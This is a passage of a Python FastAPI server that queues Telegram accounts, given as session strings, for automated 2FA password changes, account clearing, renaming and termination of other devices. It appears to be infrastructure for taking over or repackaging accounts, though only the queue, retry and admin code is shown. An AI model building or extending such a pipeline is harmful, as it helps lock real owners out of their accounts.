            session_string=session_string,
            phone_number=payload['phone_number']
        )
        
        # Save device check history (for both success and failure cases)
        await db.save_device_check(
            session_id=session_id,
            phone_number=payload['phone_number'],
            total_devices=step3_result.get('total_devices', 0),
            other_devices_terminated=step3_result.get('other_devices_terminated', 0),
            termination_status=step3_result.get('device_termination_status', 'unknown'),
            processing_time_ms=step3_result.get('processing_time_ms', 0),
            retry_count=(job.get('device_retry_count', 0) or 0)
        )
        
        if step3_result.get('success'):
            # Device check succeeded on retry
            await db.mark_job_completed(job_id)
            
            await db.save_step_result(
                job_id, session_id, 3, "device_check_retry", "completed",
                result_data={
                    "termination_status": step3_result.get('device_termination_status'),
                    "total_devices": step3_result.get('total_devices'),
                    "other_devices_terminated": step3_result.get('other_devices_terminated'),
                    "retry_success": True
                },
                processing_time_ms=step3_result.get('processing_time_ms')
            )
            
            final_payload = {
                "session_id": session_id,
                "overall_status": "completed",
                "step1_result": step1_result,
                "step2_result": step2_result,
                "step3_result": step3_result,
                "device_retry_success": True
            }
            
            await send_callback_to_main(MAIN_SERVER_URL, final_payload)
            logger.info(f"✅ Device retry succeeded for session {session_id}")
            
        elif step3_result.get('wait_required'):
            # Still waiting, schedule another retry
            device_retry_count = job.get('device_retry_count', 0) or 0
            next_retry = get_device_retry_time(device_retry_count)
            
            if next_retry and device_retry_count < 3:
                await db.schedule_device_retry(
                    job_id, device_retry_count + 1, next_retry,
                    "Device retry still waiting"
                )
                logger.info(f"Device retry {device_retry_count + 1} scheduled for {session_id}")
            else:
                # Max retries exceeded
                await db.mark_job_completed(job_id)
                
                final_payload = {
                    "session_id": session_id,
                    "overall_status": "completed_with_warning",
                    "step1_result": step1_result,
                    "step2_result": step2_result,
                    "step3_result": step3_result,
                    "warning": "Device termination max retries exceeded"
                }
                
                await send_callback_to_main(MAIN_SERVER_URL, final_payload)
                
        else:
            raise Exception(f"Device retry failed: {step3_result.get('error')}")
            
    except Exception as e:
        logger.error(f"Device retry failed for job {job_id}: {e}")
        await db.mark_job_failed(job_id, str(e))

async def send_callback_to_main(url: str, data: Dict[str, Any]) -> bool:
    """Send callback to main server"""
    try:
        async with httpx.AsyncClient(timeout=30) as http:
            response = await http.post(
                f"{url}/internal/processor-result",
                json=data,
                headers={"X-Internal-Key": INTERNAL_API_KEY}
            )
            return response.status_code == 200
    except Exception as e:
        logger.error(f"Failed to send callback: {e}")
        return False

# ==================== BACKGROUND WORKER ====================
async def worker_loop(db: Database):
    """Main worker loop for processing jobs"""
    regular_semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
    device_retry_semaphore = asyncio.Semaphore(MAX_CONCURRENT_DEVICE_RETRIES)
    
    while True:
        try:
            # Get batch size from environment variable
            device_retry_batch_size = DEVICE_RETRY_BATCH_SIZE
            
            # First, check for device retry jobs
            device_retry_jobs = await db.get_device_retry_jobs(limit=device_retry_batch_size)
            for job in device_retry_jobs:
                async with device_retry_semaphore:
                    try:
                        await process_device_retry(job, db)
                    except Exception as e:
                        logger.error(f"Device retry error: {e}")
            
            # Then, get next pending job
            job = await db.get_next_job()
            if job is None:
                await asyncio.sleep(5)
                continue
            
            async with regular_semaphore:
                try:
                    await process_job(job, db)
                except Exception as e:
                    logger.error(f"Job {job['id']} failed: {e}")
                    
                    retry_count = job.get('retry_count', 0) or 0
                    
                    # Check if it's a FloodWait exception
                    if isinstance(e, FloodWaitException):
                        flood_wait_seconds = e.retry_after
                        next_retry = datetime.utcnow() + timedelta(seconds=flood_wait_seconds)
                        await db.schedule_job_retry(job['id'], retry_count + 1, next_retry, str(e))
                        logger.info(f"Job {job['id']} scheduled for FloodWait retry in {flood_wait_seconds}s")
                    elif retry_count < MAX_RETRIES:
                        next_retry = datetime.utcnow() + timedelta(
                            seconds=RETRY_INTERVALS[min(retry_count, len(RETRY_INTERVALS)-1)]
                        )
                        await db.schedule_job_retry(job['id'], retry_count + 1, next_retry, str(e))
                        logger.info(f"Job {job['id']} scheduled for retry {retry_count + 1}")
                    else:
                        await db.mark_job_failed(job['id'], str(e))
                        
                        # Send failure callback
                        await send_callback_to_main(
                            MAIN_SERVER_URL,
                            {
                                "session_id": str(job['session_id']),
                                "overall_status": "failed",
                                "processing_error": str(e)
                            }
                        )
                        logger.error(f"Job {job['id']} marked as failed after {MAX_RETRIES} retries")
                        
        except Exception as e:
            logger.error(f"Worker loop error: {e}")
            await asyncio.sleep(5)

# ==================== FASTAPI APP ====================
db = Database()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    await db.init_pool()
    app.state.start_time = datetime.utcnow()
    worker_task = asyncio.create_task(worker_loop(db))
    logger.info("Unified Processing Server started")
    
    yield
    
    # Shutdown
    worker_task.cancel()
    await db.close()
    logger.info("Unified Processing Server stopped")

app = FastAPI(
    title="Unified Processing Server",
    description="Combined 2FA password change, spam check, and device check server",
    version="3.0.0",
    lifespan=lifespan
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== AUTHENTICATION ====================
async def verify_internal_key(x_internal_key: str = Header(default="")):
    if x_internal_key != INTERNAL_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid internal key")
    return True

async def verify_admin_key(x_admin_key: str = Header(default="")):
    if x_admin_key != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid admin key")
    return True
        
# ==================== PYDANTIC MODELS ====================
class ProcessAccountRequest(BaseModel):
    session_id: str
    session_string: str
    phone_number: str
    current_password: Optional[str] = None
    endpoint_name: str
    client_app_name: Optional[str] = None
    admin_telegram_id: Optional[int] = None
    bot_token: Optional[str] = None
    clear_account: bool = True
    leave_chats: bool = True
    block_bots: bool = True
    spam_check_required: bool = True
    set_name: Optional[str] = None
    set_username: Optional[str] = None
    callback_url: Optional[str] = None
    
    @validator('session_id')
    def validate_session_id(cls, v):
        try:
            uuid.UUID(v)
            return v
        except ValueError:
            raise ValueError('Invalid session_id format')
    
    @validator('phone_number')
    def validate_phone(cls, v):
        if not v.startswith('+'):
            raise ValueError('Phone number must start with +')
        return v
    
    @validator('session_string')
    def validate_session_string(cls, v):
        if len(v) < 20:
            raise ValueError('Invalid session string')
        return v

class JobStatusResponse(BaseModel):
    session_id: str
    status: str
    current_step: Optional[int] = None
    retry_count: Optional[int] = None
    device_retry_count: Optional[int] = None
    last_error: Optional[str] = None
    created_at: Optional[datetime] = None
    updated_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None

class HealthResponse(BaseModel):
    status: str
    service: str
    database: str
    telegram_configured: bool
    active_jobs: int
    max_concurrent_tasks: int
    uptime_seconds: float
    timestamp: datetime

class AnalyticsSummary(BaseModel):
    total_jobs: int
    completed_jobs: int
    failed_jobs: int
    pending_jobs: int
    processing_jobs: int
    waiting_retry_jobs: int
    total_password_changes: int
    total_spam_checks: int
    total_device_checks: int
    success_rate: float
    average_processing_time_ms: float

# ==================== API ENDPOINTS ====================

@app.post("/process-account")
async def process_account(request: ProcessAccountRequest, 
                          authenticated: bool = Depends(verify_internal_key)):
    """Queue account for processing through all 3 steps"""
    job_id = await db.add_job(request.session_id, request.dict())
    
    if job_id is None:
        return {"success": False, "message": "Job already exists for this session"}
    
    logger.info(f"Job {job_id} queued for session {request.session_id}")
    
    return {
        "success": True,
        "message": "Account queued for processing",
        "job_id": job_id,
        "session_id": request.session_id
    }

@app.get("/job/{session_id}", response_model=JobStatusResponse)
async def get_job_status(session_id: str, 
                         authenticated: bool = Depends(verify_internal_key)):
    """Get job status for a session"""
    try:
        async with db.pool.acquire() as conn:
            row = await conn.fetchrow('''
                SELECT session_id, status, current_step, retry_count, 
                       device_retry_count, last_error, created_at, 
                       updated_at, completed_at
                FROM processing_jobs 
                WHERE session_id = $1
            ''', uuid.UUID(session_id))
            
            if not row:
                raise HTTPException(status_code=404, detail="Job not found")
            
            return JobStatusResponse(
                session_id=str(row['session_id']),
                status=row['status'],
                current_step=row['current_step'],
                retry_count=row['retry_count'],
                device_retry_count=row['device_retry_count'],
                last_error=row['last_error'],
                created_at=row['created_at'],
                updated_at=row['updated_at'],
                completed_at=row['completed_at']
            )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to get job status: {e}")
        raise HTTPException(status_code=500, detail="Failed to get job status")

@app.get("/health", response_model=HealthResponse)
async def health_check():
    """Health check endpoint"""
    database_status = "connected"
    active_jobs = 0
    
    try:
        if db.pool:
            async with db.pool.acquire() as conn:
                await conn.execute("SELECT 1")
                active_jobs = await conn.fetchval(
                    "SELECT COUNT(*) FROM processing_jobs WHERE status IN ('processing', 'pending', 'retry', 'waiting_device_retry')"
                )
        else:
            database_status = "disconnected"
    except Exception:
        database_status = "error"
    
    uptime = (datetime.utcnow() - app.state.start_time).total_seconds() if hasattr(app.state, 'start_time') else 0
    
    return HealthResponse(
        status="healthy" if database_status == "connected" else "degraded",
        service="unified-processing-server",
        database=database_status,
        telegram_configured=bool(TELEGRAM_API_ID and TELEGRAM_API_HASH),
        active_jobs=active_jobs,
        max_concurrent_tasks=MAX_CONCURRENT_TASKS,
        uptime_seconds=uptime,
        timestamp=datetime.utcnow()
    )

@app.get("/admin/analytics", response_model=AnalyticsSummary)
async def get_analytics(admin_key: str = Depends(verify_admin_key)):
    """Get analytics summary"""
    try:
        async with db.pool.acquire() as conn:
            total_jobs = await conn.fetchval("SELECT COUNT(*) FROM processing_jobs")
            completed_jobs = await conn.fetchval("SELECT COUNT(*) FROM processing_jobs WHERE status = 'completed'")
            failed_jobs = await conn.fetchval("SELECT COUNT(*) FROM processing_jobs WHERE status = 'failed'")
            pending_jobs = await conn.fetchval("SELECT COUNT(*) FROM processing_jobs WHERE status = 'pending'")
            processing_jobs = await conn.fetchval("SELECT COUNT(*) FROM processing_jobs WHERE status = 'processing'")
            waiting_retry_jobs = await conn.fetchval("SELECT COUNT(*) FROM processing_jobs WHERE status IN ('retry', 'waiting_device_retry')")
            
            total_password_changes = await conn.fetchval("SELECT COUNT(*) FROM password_changes")
            total_spam_checks = await conn.fetchval("SELECT COUNT(*) FROM spam_checks")
            total_device_checks = await conn.fetchval("SELECT COUNT(*) FROM device_checks")
            
            avg_time = await conn.fetchval(
                "SELECT AVG(processing_time_ms) FROM step_results WHERE processing_time_ms IS NOT NULL"
            )
            
            success_rate = (completed_jobs / total_jobs * 100) if total_jobs > 0 else 0
            
            return AnalyticsSummary(
                total_jobs=total_jobs or 0,
                completed_jobs=completed_jobs or 0,
                failed_jobs=failed_jobs or 0,
                pending_jobs=pending_jobs or 0,
                processing_jobs=processing_jobs or 0,
                waiting_retry_jobs=waiting_retry_jobs or 0,
                total_password_changes=total_password_changes or 0,
                total_spam_checks=total_spam_checks or 0,
                total_device_checks=total_device_checks or 0,
                success_rate=round(success_rate, 2),
                average_processing_time_ms=round(avg_time or 0, 2)
            )
    except Exception as e:
        logger.error(f"Failed to get analytics: {e}")
        raise HTTPException(status_code=500, detail="Failed to get analytics")

@app.get("/admin/jobs")
async def get_all_jobs(limit: int = Query(50, ge=1, le=500),
                        status: Optional[str] = None,
                        admin_key: str = Depends(verify_admin_key)):
    """Get all jobs with optional status filter"""
    try:
        async with db.pool.acquire() as conn:
            if status:
                rows = await conn.fetch('''
                    SELECT id, session_id, status, current_step, retry_count,
                           device_retry_count, created_at, updated_at, completed_at
                    FROM processing_jobs 
                    WHERE status = $1
                    ORDER BY created_at DESC 
                    LIMIT $2
                ''', status, limit)
            else:
                rows = await conn.fetch('''
                    SELECT id, session_id, status, current_step, retry_count,
                           device_retry_count, created_at, updated_at, completed_at
                    FROM processing_jobs 
                    ORDER BY created_at DESC 
                    LIMIT $1
                ''', limit)
            
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"Failed to get jobs: {e}")
        raise HTTPException(status_code=500, detail="Failed to get jobs")

@app.get("/admin/job/{session_id}/steps")
async def get_job_steps(session_id: str, admin_key: str = Depends(verify_admin_key)):
    """Get step results for a job"""
    try:
        async with db.pool.acquire() as conn:
            rows = await conn.fetch('''
                SELECT step_number, step_name, status, result_data, 
                       error_message, processing_time_ms, started_at, completed_at
                FROM step_results 
                WHERE session_id = $1
                ORDER BY id DESC
            ''', uuid.UUID(session_id))
            
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"Failed to get job steps: {e}")
        raise HTTPException(status_code=500, detail="Failed to get job steps")

@app.get("/")
async def root():
    """Root endpoint"""
    return {
        "service": "Unified Processing Server",
        "version": "3.0.0",
        "status": "running",
        "steps": [
            "Step 1: Password Change",
            "Step 2: Spam Check & Cleanup",
            "Step 3: Device Check"
        ],
        "features": {
            "concurrent_processing": True,
            "retry_logic": True,
            "device_retry_scheduling": True,
            "analytics": True,
            "flood_wait_handling": True,
            "separate_device_retry_pool": True
        }
    }

# ==================== MAIN ENTRY POINT ====================
if __name__ == "__main__":
    import uvicorn
    
    uvicorn.run(
        "unified_processing_server:app",
        host="0.0.0.0",
        port=int(os.getenv("PORT", "8000")),
        reload=False,
        log_level="info",
        workers=1
    )
